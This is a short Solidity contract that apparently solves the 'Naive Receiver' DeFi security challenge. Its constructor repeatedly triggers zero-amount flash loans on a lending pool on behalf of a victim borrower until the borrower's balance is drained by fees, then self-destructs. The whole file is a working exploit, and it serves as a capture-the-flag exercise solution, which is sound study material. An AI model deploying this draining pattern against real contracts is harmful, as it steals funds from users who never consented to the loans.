// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract NaiveDrainer {
    constructor(address payable pool, address borrower) {
        while (borrower.balance > 0) {
            NaiveReceiverLenderPool(pool).flashLoan(borrower, 0);
        }
        selfdestruct(pool);
    }
}